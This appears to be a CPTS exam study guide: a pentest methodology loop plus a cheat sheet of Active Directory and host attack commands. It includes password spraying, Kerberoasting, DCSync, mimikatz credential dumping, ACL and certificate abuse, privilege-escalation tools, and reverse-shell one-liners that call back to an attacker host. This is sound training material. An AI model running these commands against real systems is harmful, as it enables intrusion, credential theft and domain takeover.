

Your 26 notes are a reference library. You do NOT read them top to bottom during a
box or the exam. You follow the loop below, and you open a specific note only when
the loop lands you on that situation. The map is the plan. The notes are the lookup.

The CPTS exam is a realistic enterprise network, mostly Active Directory. You get a
foothold on one machine, then work inward to Domain Admin, keeping notes and
screenshots the whole time for the report. So the whole game is this one loop,
repeated per host, with AD as the endgame.

> **Jump to the cheat sheets:** the second half of this page (after "KIT CHEAT SHEETS")
> is a one-glance command reference for every tool — recon, web fuzzing, nxc, impacket,
> bloodyAD, Kerberos, certipy, cracking, pivoting, shells, and **Windows/Linux search
> one-liners**. During a box, follow the loop; when you know *what* you want to do, grab
> the exact command from the cheat sheet.

---

## THE CORE LOOP (memorise this, not the notes)

```
   ENUMERATE  ->  GET A FOOTHOLD  ->  ENUMERATE LOCALLY  ->  PRIVESC
        ^                                                        |
        |                                                        v
        +----------  PIVOT / MOVE to a new target  <--  LOOT CREDENTIALS
```

Every machine, every time: enumerate it fully, get on it, look around as that
user, escalate to admin/root, steal every credential you can, use those creds to
reach the next machine. Repeat until you own the domain.

The single biggest cause of failure is not weak exploitation. It is incomplete
enumeration (missing a port, a vhost, a share, a user, a cred). When stuck, the
answer is almost always "enumerate more," not "find a better exploit."

# My GO-TO Tools at a glance 

nmap, dig, nslookup, ffuf, feroxbuster, gobuster, eyewitness, whatweb, curl, netexec (nxc), smbclient, enum4linux-ng, ldapsearch, rpcclient, showmount, mount, snmpwalk, onesixtyone, kerbrute, responder, impacket, bloodyAD, BloodHound, kinit, klist, ntpdate, certipy, PassTheCert, hashcat, john, mimikatz, pypykatz, lazagne, firepwd, cmdkey, linpeas, winpeas, PrintSpoofer, GodPotato, JuicyPotatoNG, evil-winrm, RunasCs, ligolo-ng, ssh, wget, scp, certutil, netcat (nc), rlwrap, metasploit (msf), sqlmap.


---

## STAGE 1 - ENUMERATE (external / the target in front of you)

Goal: full map of ports, services, versions, web apps, usernames.
Notes: Nmap -> Footprinting -> Info Gathering Web -> Vuln Assessment

- Full TCP scan, then service/version scan on open ports, then script scan.
- For every service, ask "how do I talk to it and what does it leak?"
- Web found? -> go to Stage 2 web branch. Add vhosts/dirs with ffuf, proxy.
- Write down every username, hostname, version, share, path you see. These are keys.

## STAGE 2 - GET A FOOTHOLD (first shell / first valid login)

Pick the branch that matches what Stage 1 found:

- WEB: Web Attacks + SQLi + XSS + File Inclusion +
  File Upload + Command Injection + Attacking Common Apps +
  ffuf + Login Brute Forcing. Command injection / file upload / LFI->RCE
  are your fastest paths to a shell.
- SERVICES: Attacking Common Services + Password Attacks (spray/brute).
- EXPLOIT: Shells & Payloads to catch/stabilise the shell, Metasploit if
  allowed and it fits, File Transfers to get tools in and loot out.
Output of this stage: a shell or valid creds on one box.

## STAGE 3 - ENUMERATE LOCALLY (situational awareness)

You are on the box. Before anything, look around AS THIS USER.
Notes: top of Linux Privesc / Windows Privesc (their enumeration sections)

- Who am I, what groups, what can I run, what is installed, what is listening
  locally (loopback ports = more services), what files/creds are lying around.
- Are we domain-joined? If yes, AD is in play -> remember Stage 5.

## STAGE 4 - PRIVESC (become root / SYSTEM / local admin)

Notes: Linux Privilege Escalation  OR  Windows Privilege Escalation

- Run the enumeration, pick the one concrete misconfig (SUID, sudo, service, token,
  cron, writable path, kernel), exploit it. One clean path, not ten half-tries.

## STAGE 5 - LOOT CREDENTIALS (the fuel for moving)

This is what turns one box into the whole network.

Notes: Password Attacks, plus the credential sections of the Privesc notes and the AD note
- Dump hashes, grab config files, SSH keys, browser/app creds, memory (LSASS on
  Windows), password reuse. Every cred is a possible key to another machine.

## STAGE 6 - PIVOT / MOVE

Notes: Pivoting, Tunneling, and Port Forwarding

- Use the compromised box as a gateway to reach the internal network you could not
  see before. Set up the tunnel, then re-run Stage 1 against the new internal hosts.

## STAGE 7 - ACTIVE DIRECTORY (the endgame, the bulk of CPTS)

This is where most CPTS points live. The AD note is your bible here, with Password Attacks and Attacking Common Services.

Rough AD flow once you have ANY domain foothold or cred:
1. Enumerate the domain: users, groups, computers, shares, GPOs. Map attack paths
   with BloodHound.
2. Easy cred wins: AS-REP Roasting, Kerberoasting, password spraying, SMB null/guest,
   LLMNR/NBT-NS poisoning if in scope.
3. Abuse what BloodHound shows: ACL abuse, delegation, GPO abuse, nested group rights.
4. Move laterally with creds/hashes (pass-the-hash, over-pass-the-hash, WinRM, PsExec).
5. Escalate to Domain Admin / DCSync / domain compromise.

Always: after every new box or cred, go back to Stage 1/5 on the new reachable hosts.

---

## REPORTING (do this DURING, not after)

CPTS is pass/fail on flags AND a professional report. If you did not screenshot it
and note it, it did not happen.
- Keep a running log per host: IP, how you enumerated, how you got in, how you
  escalated, what creds you found, screenshots of each step and each flag.
- A clean methodology above gives you a clean report structure for free.

---

## WHEN YOU ARE STUCK (the checklist that unsticks 90% of boxes)

1. Did I scan ALL ports, not just the top 1000? Re-scan full range.
2. Did I check every web vhost and directory? ffuf again.
3. Did I enumerate every service's version and search it?
4. Am I reusing every credential I already found, everywhere? (password reuse is king)
5. On the box: did I check loopback-only listening ports? Local services = new surface.
6. Domain-joined? Then stop guessing and run BloodHound.
7. Still stuck? Enumerate more. The exploit is rarely the missing piece.


---
---

# 🧰 KIT CHEAT SHEETS (one glance → the command)

**Placeholders** (swap these everywhere): `<IP>` target · `<DC>` DC IP · `<DCFQDN>` e.g. `dc.domain.local` · `DOMAIN` e.g. `domain.local` · `<user>` `<pass>` · `<NTHASH>` · `<TUN>` your tun0 IP · `<PORT>` your listener port.

> **Reading nxc marks:** `[*]` reachable (not tested) · `[+]` login worked · `[-]` failed · `(Pwn3d!)` you're admin there.

---

## 0) 🧭 DECISION TABLE — "what do I see → what do I do NOW"

Scan the left column for the thing in front of you; the right column is the move (and which section's commands).

| What you see / have | What it means | Do this NOW |
|---|---|---|
| Open ports but no idea where to start | Enumeration not done | Full `-p-` then `-sCV`; if web, fuzz it |
| A web app (login/search/upload/`?file=`) | Structural vuln class exists | fuzz (paths→params→values); the feature names the bug (login=SQLi, `?file=`=LFI, upload=webshell) |
| **No creds at all**, but a DC/SMB is up | Zero-cred AD phase | null/guest → RID brute → kerbrute → AS-REP → spray |
| **Your FIRST valid domain cred** | Stop guessing, start mapping | 1) validate it **everywhere** (`nxc smb/winrm range`) 2) **BloodHound** 3) `--shares` 4) Kerberoast/AS-REP |
| nxc banner `NTLM:False` | Domain is **Kerberos-only** | Do the 4-step krb5 setup → use `-k` everywhere |
| nxc `[+]` but **no `(Pwn3d!)`**, no WinRM | Valid cred, but value is its **AD rights** | That's a BloodHound question, then abuse the edge |
| nxc `(Pwn3d!)` | You're admin on that host | Dump it: `--sam`/`--lsa`/`-M lsassy`/`--ntds` |
| You have a **hash, not a password** | Pass-the-hash | `-H <NTHASH>` (nxc), `-hashes :<NTHASH>` (impacket), evil-winrm `-H` |
| BloodHound shows an **edge** (GenericAll/WriteOwner/…) | ACL abuse path | Find the row in bloodyAD → run it → re-login |
| `nxc ldap -M adcs` says a CA exists | ADCS in play | `certipy find -vulnerable` → ESC1 etc. |
| `certipy auth` → `KDC_ERR_PADATA_TYPE_NOSUPP` | DC has no PKINIT | Split pfx → **PassTheCert** over LDAPS |
| Interactive shell as a **real user** (C:\Users\name) | Loot the user | browsers/DPAPI/cred-mgr → `lazagne all`, firepwd |
| `whoami /priv` shows **SeImpersonate** | Token privesc | PrintSpoofer / GodPotato → SYSTEM |
| `sudo -l` / a SUID binary | Linux privesc | Look it up on **GTFOBins** |
| A **deleted/disabled** user with a known password | Recycle Bin / UAC flag | restore / re-enable via bloodyAD |
| A **password-protected file** (.xlsx/.zip/.kdbx/.psafe3/id_rsa) | Offline crack | the `*2john` family |
| Config / share / DB with creds in it | Candidate secrets | **spray** them across all users (never assume the label — validate) |
| Host has a **2nd NIC / new subnet** you can't reach | Pivot point | Ligolo-ng tunnel → re-run recon on the internal range |
| Account with **DCSync** (WriteDACL on domain) | Endgame | `secretsdump -just-dc-ntlm` → PtH as Administrator |

**The habit:** every time you get a new cred/hash/shell, come back to this table — the next move is almost always "validate/spray it, or map what it can do," not "find a new exploit."

---

## 1) Recon & scanning (nmap + DNS + host discovery)

| Goal | Command |
|---|---|
| Fast all-ports sweep | `sudo nmap -p- --min-rate 10000 --open <IP> -oA allports` |
| Service/version/script on found ports | `sudo nmap -p<ports> -sCV <IP> -oA services` |
| UDP top ports | `sudo nmap -sU --top-ports 100 <IP>` |
| Scan from a scope file | `sudo nmap --open -p- -A -iL scope -oA tcp_all` |
| Ping sweep a range (find live hosts) | `sudo nmap -sn 10.129.0.0/16 -oA live` → `grep Up live.gnmap \| cut -d' ' -f2 > targets.txt` |
| Pull a clean service list from .gnmap | `grep -oP '\d+/open/\w+//\K[^/,]+' tcp_all.gnmap \| sort \| uniq -c \| sort -nr` |
| DNS zone transfer (free subdomains) | `dig axfr DOMAIN @<IP>` |
| DNS any record | `nslookup -type=any DOMAIN <IP>` |
| Reverse DNS | `dig -x <IP> @<IP>` |

---

## 2) Web fuzzing (ffuf / feroxbuster / gobuster / params)

5 rules:
1. Fuzz directorie
2. Fuzz Subdomain
3. Fuzz parameter
4. Fuzz value
5. Use bigger lists.

| Goal | Command |
|---|---|
| Directory/file brute (catch-all → `-ac`, add ext) | `ffuf -u http://<IP>/FUZZ -e .php,.txt,.bak -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ac -t 50` |
| Recursive (finds nested files) | `feroxbuster -u http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,txt -d 3 -t 50 -k` |
| Authenticated fuzz (session cookie) | `feroxbuster -u http://<IP>/admin/ -b "PHPSESSID=<S>" -w list.txt -x php -k` |
| VHost fuzz (get the "not found" size first) | `curl -s -I http://<IP> -H 'Host: x.DOMAIN' \| grep Content-Length` → `ffuf -w subs.txt:FUZZ -u http://<IP>/ -H 'Host: FUZZ.DOMAIN' -fs <size>` |
| Parameter name discovery (layer 2) | `ffuf -u 'http://<IP>/page?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac` |
| Arjun param finder | `arjun -u http://<IP>/page.php` |
| Fingerprint | `whatweb http://<IP>` · `curl -skI http://<IP> \| grep -i 'server\|powered'` |

---

## 3) eyewitness — screenshot web apps / vhosts

| Goal | Command |
|---|---|
| Screenshot a list of hosts/vhosts | `eyewitness -f subdomains.txt -d out` |

---

## 4) SMB / LDAP / RPC / NFS enumeration

| Goal | Command |
|---|---|
| SMB banner + signing + NTLM state | `nxc smb <IP>` |
| List shares (null/guest/creds) | `smbclient -L //<IP> -N` · `nxc smb <IP> -u '' -p '' --shares` |
| Browse a share | `smbclient //<IP>/<share> -N` → `ls`, `get <file>`, `recurse ON; prompt OFF; mget *` |
| Full SMB/AD enum | `enum4linux-ng -A <IP>` |
| LDAP anonymous dump | `ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local"` · naming contexts: `ldapsearch -x -H ldap://<IP> -s base namingcontexts` |
| RPC null session | `rpcclient -U '' -N <IP>` → `enumdomusers`, `queryuser 0x<rid>`, `querydispinfo` |
| RPC endpoint dump (service surface) | `impacket-rpcdump @<IP>` → `egrep 'MS-RPRN\|MS-PAR\|MS-DRSR'` (spooler / DCSync hints) |
| NFS exports → mount | `showmount -e <IP>` → `sudo mount -t nfs <IP>:/export /mnt/x` |
| SNMP | `snmpwalk -v2c -c public <IP>` |

---

## 5) onesixtyone — SNMP community-string brute

| Goal | Command |
|---|---|
| Brute community strings | `onesixtyone -c community.txt <IP>` |

---

## 6) AD with NO credentials yet (zero-cred attacks)

| Goal | Command |
|---|---|
| SMB null / guest | `nxc smb <DC> -u '' -p ''` · `nxc smb <DC> -u guest -p ''` |
| RID cycling (build a user list) | `nxc smb <DC> -u guest -p '' --rid-brute` · `impacket-lookupsid DOMAIN/guest@<DC>` |
| Kerbrute user enum (no lockout) | `kerbrute userenum -d DOMAIN --dc <DC> users.txt` |
| AS-REP roast (no creds) | `impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip <DC> -format hashcat -outputfile asrep.hash` → `hashcat -m 18200` |
| Password spray (ONE pass, all users) | `nxc smb <DC> -u users.txt -p 'Welcome1' --continue-on-success` |
| Poisoning (if in scope) | `sudo responder -I tun0` → crack NTLMv2 with `-m 5600` |

> **Spray rule:** one password across many users, never many passwords on one user (that locks accounts). Check policy first: `nxc smb <DC> -u <u> -p '<p>' --pass-pol`.

---

## 7) nxc (NetExec) — the swiss-army knife

**Auth:** `-u user -p 'pass'` · hash `-u user -H '<NTHASH>'` · local acct add `--local-auth` · Kerberos add `-k`. Protocols: `smb winrm rdp ldap mssql ssh`.

| Goal | Command |
|---|---|
| Check a cred across a range | `nxc smb 172.16.8.0/23 -u user -p 'pass'` |
| Where can I WinRM / RDP? | `nxc winrm 172.16.8.0/23 -u user -p 'pass'` · `nxc rdp ...` |
| Shares + my access | `nxc smb <IP> -u user -p 'pass' --shares` |
| Crawl all readable shares | `nxc smb <IP> -u user -p 'pass' -M spider_plus` (add `-o DOWNLOAD_FLAG=True`) |
| Users / groups / policy | `--users` · `--groups` · `--pass-pol` |
| Confirm ADCS (then use certipy) | `nxc ldap <DC> -u user -p 'pass' -M adcs` |
| Kerberoast / AS-REP | `nxc ldap <DC> -u user -p 'pass' --kerberoasting k.txt` · `--asreproast a.txt` |
| BloodHound collect | `nxc ldap <DC> -u user -p 'pass' --bloodhound -c All --dns-server <DC>` |
| Read LAPS | `nxc ldap <DC> -u user -p 'pass' --laps` |
| GPP / descriptions | `-M gpp_password` · `-M gpp_autologin` · `nxc ldap <DC> ... -M get-desc-users` |
| Relay list (no SMB signing) | `nxc smb 172.16.8.0/23 --gen-relay-list relay.txt` |
| **Admin only ↓** | |
| Dump SAM / LSA / LSASS / NTDS | `--sam` · `--lsa` · `-M lsassy` · `--ntds` |
| Run command | `nxc smb <IP> -u admin -p 'pass' -x 'whoami'` (`-X` = PowerShell) |

**`--local-auth`?** domain account (from BloodHound/DC/`--users`) → **no**; local account (from `unattend.xml`, `lsadump::sam`, `--sam`) → **yes**. Unsure → try both, `[+]` wins. `(Pwn3d!)` = admin; plain `[+]` = logged in only.

---

## 8) impacket — exec / dump / tickets

**Auth:** pw `DOMAIN/user:'pass'@<IP>` · hash `DOMAIN/user@<IP> -hashes :<NTHASH>` · Kerberos `export KRB5CCNAME=u.ccache` then `-k -no-pass` (use the **hostname**, not IP).

| Goal | Command |
|---|---|
| AS-REP roast | `impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip <DC> -format hashcat -outputfile asrep.hash` |
| Kerberoast (all) | `impacket-GetUserSPNs DOMAIN/user:'pass' -dc-ip <DC> -request -outputfile spns.hash` |
| Kerberoast (targeted) | `impacket-GetUserSPNs DOMAIN/user:'pass' -dc-ip <DC> -request-user <target>` |
| DCSync (all / one) | `impacket-secretsdump DOMAIN/user:'pass'@<DCFQDN> -just-dc-ntlm` · `-just-dc-user administrator` |
| Dump remote hashes (admin) | `impacket-secretsdump DOMAIN/admin:'pass'@<IP>` |
| Dump offline hives | `impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL` |
| Dump offline ntds | `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL` |
| SYSTEM shell (noisy) / user shell (quieter) | `impacket-psexec DOMAIN/admin:'pass'@<IP>` · `impacket-wmiexec ...` · `impacket-smbexec ...` |
| SMB browse | `impacket-smbclient DOMAIN/user:'pass'@<IP>` → `shares`, `use <s>`, `get <f>` |
| MSSQL | `impacket-mssqlclient DOMAIN/user:'pass'@<IP> -windows-auth` → `enable_xp_cmdshell` → `xp_cmdshell whoami` |
| Get TGT | `impacket-getTGT DOMAIN/user:'pass' -dc-ip <DC>` → `export KRB5CCNAME=user.ccache` |
| Add computer (MAQ) | `impacket-addcomputer DOMAIN/user:'pass' -computer-name evilpc -computer-pass 'Passw0rd!' -dc-ip <DC>` |
| RBCD → impersonate | `impacket-getST -spn cifs/<TARGETFQDN> -impersonate administrator DOMAIN/evilpc$:'Passw0rd!' -dc-ip <DC>` |
| DPAPI masterkey → cred | `impacket-dpapi masterkey -file <mk> -sid <SID> -password '<pw>'` → `impacket-dpapi credential -file <blob> -key <mk-key>` |
| NTLM relay | `impacket-ntlmrelayx -tf relay.txt -smb2support` |
| SMB server (file transfer) | `impacket-smbserver share . -smb2support -username u -password p` |

---

## 9) bloodyAD — BloodHound edge → abuse

Base: `B="bloodyAD --host <DC> -d DOMAIN -u <user> -p '<pass>'"` (hash: `-p ':<NTHASH>'`; Kerberos: add `-k`).

**Enumerate:** `$B get writable --detail` · `$B get membership <user>` · `$B get object <target>`

| Edge | Command | Then |
|---|---|---|
| **ForceChangePassword** | `$B set password <target> 'NewPass123!'` | log in as them |
| **GenericWrite/All** (Kerberoast) | `$B set object <target> servicePrincipalName -v 'fake/LEGIT'` | `GetUserSPNs -request-user <target>` → `-m 13100` |
| **GenericWrite/All** (AS-REP) | `$B add uac <target> -f DONT_REQ_PREAUTH` | `GetNPUsers` → `-m 18200` |
| **GenericWrite/All** (Shadow Creds) | `$B add shadowCredentials <target>` | prints NT hash → PtH |
| **AddMember/AddSelf** | `$B add groupMember "<group>" <user>` | re-login for new rights |
| **WriteOwner / Owns** | `$B set owner <target> <user>` → `$B add genericAll <target> <user>` | use a GenericAll row |
| **WriteDACL** (domain) | `$B add dcsync <user>` | `secretsdump -just-dc-ntlm` |
| **GenericWrite** (computer, RBCD) | `$B add computer evilpc 'Passw0rd!'` → `$B add rbcd 'TARGET$' 'evilpc$'` | `getST -impersonate administrator` |
| **ReadLAPSPassword** | `$B get search --filter '(ms-mcs-admpwd=*)' --attr ms-mcs-admpwd` | log in as local admin |
| **ReadGMSAPassword** | `$B get object 'svc_gmsa$' --attr msDS-ManagedPassword` | PtH |
| **GenericAll** (disabled user) | `$B remove uac <target> -f ACCOUNTDISABLE` | log in |

**Cleanup:** clear SPN `$B set object <target> servicePrincipalName` (no `-v`) · `$B remove uac ... -f DONT_REQ_PREAUTH` · `$B remove groupMember ...` · `$B remove dcsync <user>` · `$B remove rbcd ...`.

**Memory trick:** user edge → change/roast/steal a key · group edge → join it · domain WriteDACL → DCSync.

---

## 10) BloodHound collection

| From | Command |
|---|---|
| Linux (remote, best) | `bloodhound-python -c All -u <user> -p '<pass>' -d DOMAIN -ns <DC> -dc <DCFQDN> --zip` (Kerberos: add `-k`) |
| via nxc | `nxc ldap <DC> -u <user> -p '<pass>' --bloodhound -c All --dns-server <DC>` |
| On a Windows host | `SharpHound.exe -c All` (or `.ps1`: `Invoke-BloodHound -CollectionMethod All`) |

In the GUI: mark owned users, run "Shortest paths to Domain Admins" and "from owned". The **edge** on a path tells you which bloodyAD row above to run.

---

## 11) Kerberos & Kerberos-only boxes (`NTLM:False`)

When nxc shows `NTLM:False` (or `-k` is required), do these 4 things first:

```bash
echo '<IP> DOMAIN <DCFQDN> DC' | sudo tee -a /etc/hosts
sudo ntpdate DOMAIN
kinit <user>
klist
```

`/etc/krb5.conf` (realm UPPERCASE, `kdc` = DC FQDN):

```
[libdefaults]
    default_realm = DOMAIN.UPPER
[realms]
    DOMAIN.UPPER = { kdc = <DCFQDN> }
[domain_realm]
    .domain.lower = DOMAIN.UPPER
    domain.lower = DOMAIN.UPPER
```

| Goal                            | Command                                                                         |
| ------------------------------- | ------------------------------------------------------------------------------- |
| Ticket from password            | `kinit <user>` (or `impacket-getTGT DOMAIN/user:'pass'`)                        |
| Ticket from hash (overpass)     | `impacket-getTGT DOMAIN/user -hashes :<NTHASH>`                                 |
| Use a ccache                    | `export KRB5CCNAME=user.ccache` then any tool with `-k -no-pass`                |
| evil-winrm over Kerberos        | `kinit <user>` → `evil-winrm -i <DCFQDN> -r DOMAIN.UPPER`                       |
| PtH the Kerberos way (NTLM off) | `impacket-psexec -k -no-pass 'DOMAIN/Administrator@<DCFQDN>' -hashes :<NTHASH>` |

**Targeting rule on `-k`:** target the **FQDN or IP**, never the bare domain. Clock skew > 5 min = `KRB_AP_ERR_SKEW` → re-run `ntpdate`.

---

## 12) certipy / ADCS (cert abuse)

| Goal | Command |
|---|---|
| Find vulnerable templates | `certipy find -u <user> -p '<pass>' -dc-ip <DC> -vulnerable -stdout` |
| ESC1 request as admin | `certipy req -username '<user>' -password '<pass>' -ca <CA-NAME> -template <TPL> -upn administrator@DOMAIN -dc-ip <DC>` |
| Auth with pfx → hash/TGT | `certipy auth -pfx administrator.pfx -dc-ip <DC> -domain DOMAIN` |
| Split pfx (for PassTheCert) | `certipy cert -pfx admin.pfx -nocert -out admin.key` · `certipy cert -pfx admin.pfx -nokey -out admin.crt` |
| PassTheCert LDAP shell (PKINIT fails) | `python passthecert.py -action ldap-shell -crt admin.crt -key admin.key -domain DOMAIN -dc-ip <DC>` → `add_user_to_group <you> administrators` |
| PassTheCert RBCD | `python passthecert.py -action write_rbcd -delegate-to 'DC$' -delegate-from 'evilpc$' -crt admin.crt -key admin.key -domain DOMAIN -dc-ip <DC>` |
| Shadow Credentials (auto) | `certipy shadow auto -u <user>@DOMAIN -p '<pass>' -account <target> -dc-ip <DC>` |

> `KDC_ERR_PADATA_TYPE_NOSUPP` from `certipy auth` = DC has no PKINIT → use **PassTheCert** over LDAPS instead. Machine-account password must meet complexity or `certipy req` → `rpc_s_access_denied`.

---

## 13) Cracking — hashcat / john + the `*2john` family

**Hashcat modes:** NTLM `1000` · NTLMv2 `5600` · Kerberoast TGS `13100` · AS-REP `18200` · DCC2 (cached) `2100` · NetNTLMv1 `5500` · md5 `0` · sha1 `100` · bcrypt `3200` · Office `9600` · PDF `10500`.

| File → hash | Command | Crack |
|---|---|---|
| Office (.xlsx/.docx) | `office2john file.xlsx > h` | `hashcat -m 9600 h rockyou.txt` |
| Password Safe (.psafe3) | `pwsafe2john file.psafe3 > h` | `john h` |
| SSH private key | `ssh2john id_rsa > h` | `john h` |
| ZIP / RAR / 7z | `zip2john f.zip > h` (`rar2john`, `7z2john`) | `john h` |
| KeePass (.kdbx) | `keepass2john f.kdbx > h` | `john h` |
| Ansible Vault | `ansible2john vaultfile > h` | `john h` then `ansible-vault decrypt` |
| PDF | `pdf2john f.pdf > h` | `hashcat -m 10500 h rockyou.txt` |
| Generic | `hashid '<hash>'` / `hash-identifier` | pick the mode |

Cracking helpers: `hashcat -m <mode> h rockyou.txt` · `--show` to reprint cracked · `--username` to keep user:hash mapping · clean DB dumps with `grep -oE '[a-f0-9]{32}' dump > hashes`.

---

## 14) Credential looting on a host

**Windows (as admin/SYSTEM):**

| Source | Command |
|---|---|
| LSASS (plaintext/NTLM/tickets) | mimikatz `privilege::debug` → `sekurlsa::logonpasswords` · offline: `pypykatz lsa minidump lsass.dmp` |
| SAM / LSA | mimikatz `lsadump::sam` · `lsadump::secrets` · or `reg save hklm\sam sam.save` (+ system/security) → impacket offline |
| DPAPI (browser/RDP/cred mgr) | need blob + masterkey + SID → `impacket-dpapi` · or mimikatz `dpapi::` |
| Browser passwords | `lazagne.exe all` (or `browsers`) · Firefox `key4.db`+`logins.json` → `firepwd` |
| Credential Manager / stored | `cmdkey /list` → `runas /savecred` |
| PowerShell history | `type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` |

**Linux:**

| Source | Command |
|---|---|
| Shadow (if readable) | `cat /etc/shadow` → `unshadow passwd shadow > h` → `john h` |
| SSH keys | `find / -name id_rsa 2>/dev/null` · `~/.ssh/` |
| History / env | `cat ~/.bash_history` · `env` · `cat ~/.*_history` |
| Config creds | see search one-liners |

---

## 15) 🔎 SEARCH / FIND one-liners (Windows + Linux)

**Linux — find files & creds:**

```bash
find / -name "*.txt" 2>/dev/null                               # files by name

find / -name flag.txt 2>/dev/null ; find / -name user.txt -o -name root.txt 2>/dev/null

find / -perm -4000 2>/dev/null                                 # SUID binaries (privesc)
find / -writable -type d 2>/dev/null                           # writable dirs

grep -RniE 'password|passwd|secret|api[_-]?key|connectionstring|bind|token' / 2>/dev/null

grep -RniE 'password|secret|credential' /var/www /home /opt /etc 2>/dev/null
locate id_rsa 2>/dev/null ; ls -la ~/.ssh                      # ssh keys

find / -name "*.conf" -o -name "*.config" -o -name "*.env" 2>/dev/null

cat /etc/crontab ; ls -la /etc/cron.*                          # scheduled jobs
```

**Windows (PowerShell) — find files & creds:**

```powershell
Get-ChildItem -Path C:\ -Recurse -Filter *.txt -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.ini,*.config,*.xml,*.ps1,*.bak,*.kdbx -ErrorAction SilentlyContinue
# grep-equivalent across config/source (the go-to cred sweep, with context):

Get-ChildItem C:\inetpub,C:\xampp,C:\Users -Recurse -Include *.config,*.php,*.xml,*.ini,*.txt,*.json,*.ps1,*.bak 2>$null | Select-String -Pattern "password|passwd|pwd|connectionString|secret|api[_-]?key|credential" -Context 1,3 2>$null | Out-String -Width 4000

Get-ChildItem -Force C:\Users\<u>\AppData\Roaming\Microsoft\Credentials  # hidden DPAPI blobs (tree won't show these)

findstr /si password *.txt *.xml *.config *.ini                  # cmd equivalent

Get-ChildItem -Path C:\ -Recurse -Filter "unattend.xml" -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\ -Recurse -Filter "web.config" -ErrorAction SilentlyContinue
```

**Hidden/system files** (`Credentials`, `Protect`, `Crypto`) don't show with `tree` or plain `dir` — use `Get-ChildItem -Force` / `dir /a`.

---

## 16) Privesc quick refs

**Linux (run first):**

```bash
id ; sudo -l                      # groups + what you can run as root
find / -perm -4000 2>/dev/null    # SUID → gtfobins.github.io
getcap -r / 2>/dev/null           # capabilities
./linpeas.sh                      # full sweep
```

Any `NOPASSWD` binary or SUID → look it up on **GTFOBins**. Example (openssl read root key): `LFILE=/root/.ssh/id_rsa; sudo /usr/bin/openssl enc -in $LFILE`.

**Windows (run first):**

```powershell
whoami /priv ; whoami /groups
```

- **SeImpersonate / SeAssignPrimaryToken** → `PrintSpoofer.exe -i -c cmd` / `GodPotato -cmd cmd` / `JuicyPotatoNG` → SYSTEM.
- `winPEASany.exe` full sweep · services: `Get-CimInstance win32_service | ? {$_.StartName -notlike "*LocalSystem*"}` · unquoted paths · `AlwaysInstallElevated` · writable service binaries.

---

## 17) Lateral movement & shells (Windows)

| Goal | Command |
|---|---|
| WinRM shell (pw / hash / Kerberos) | `evil-winrm -i <IP> -u <user> -p '<pass>'` · `-H <NTHASH>` · `-r DOMAIN.UPPER` |
| evil-winrm file transfer | `upload local remote` · `download remote local` |
| Run as another user (have their pw) | `RunasCs.exe <user> <pass> cmd -r <TUN>:<PORT>` · Windows: `runas /user:DOMAIN\<u> cmd` |
| Exec via impacket | `impacket-wmiexec` (quiet) / `impacket-psexec` (SYSTEM, noisy) / `impacket-smbexec` |
| Run cmd via nxc (admin) | `nxc smb <IP> -u admin -p 'pass' -x 'whoami'` (`-X` PowerShell) |

---

## 18) Pivoting — Ligolo-ng (preferred), SSH, chisel

**Ligolo-ng (native routing — no proxychains, every tool works):**

```bash
# your box (once per boot):
sudo ip tuntap add user $USER mode tun ligolo ; sudo ip link set ligolo up
./proxy -selfcert                                    # starts the listener console

# on the pivot host (agent connects BACK to you on 11601):
./agent -connect <TUN>:11601 -ignore-cert           # (agent.exe on Windows)
# in the proxy console: session → pick it → start

# your box — route the internal subnet through the tunnel:
sudo ip route add 172.16.8.0/23 dev ligolo
# now scan natively: nmap -sT, nxc, evil-winrm all just work on 172.16.8.x
```

Reverse shells back through Ligolo: console `listener_add --addr 0.0.0.0:<PORT> --to 127.0.0.1:<PORT>`. Double pivot: add a 2nd tun (`ligolo2`), add a relay listener on the previous hop's session, run a 2nd agent on the deeper host pointing at the previous hop's internal IP.

**SSH dynamic (quick fallback):** `ssh -D 9050 user@<pivot>` → `/etc/proxychains.conf` last line `socks5 127.0.0.1 9050` → `proxychains nmap -sT -p... <internal>` (⚠ `-sT` only, slow). Local fwd a single port: `ssh -L 8080:127.0.0.1:8080 user@<pivot>`.

**chisel (when no SSH):** attacker `./chisel server -p 8000 --reverse` · pivot `./chisel client <TUN>:8000 R:socks` → proxychains via `socks5 127.0.0.1 1080`.

---

## 19) File transfer (get tools in / loot out)

**Serve from attacker:** `python3 -m http.server 80` · `impacket-smbserver share . -smb2support -username u -password p`

| To Linux | To Windows |
|---|---|
| `wget http://<TUN>/f` / `curl -O http://<TUN>/f` | `certutil -urlcache -f http://<TUN>/f f.exe` |
| `scp f user@<IP>:/tmp` | `powershell iwr http://<TUN>/f -o f.exe` |
| base64: `base64 -w0 f` → paste → `base64 -d` | `powershell (New-Object Net.WebClient).DownloadFile('http://<TUN>/f','f.exe')` |
| mount SMB: `mount -t nfs ...` | `net use \\<TUN>\share /user:u p` → `copy \\<TUN>\share\f` |
| evil-winrm: `download <remote> <local>` | evil-winrm: `upload <local> <remote>` |

---

## 20) Reverse shells + TTY upgrade

| Payload (URL-encode `>`=`%3E` `&`=`%26` space=`%20` in webshells)                                                                                           |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| bash: `bash -c 'bash -i >& /dev/tcp/<TUN>/<PORT> 0>&1'`                                                                                                     |
| nc: `nc -e /bin/bash <TUN> <PORT>` · no-`-e`: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc <TUN> <PORT> >/tmp/f`                                |
| socat (full TTY): listener `socat file:$(tty),raw,echo=0 tcp-listen:<PORT>` · target `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<TUN>:<PORT>` |
| python: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<TUN>",<PORT>));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'`    |
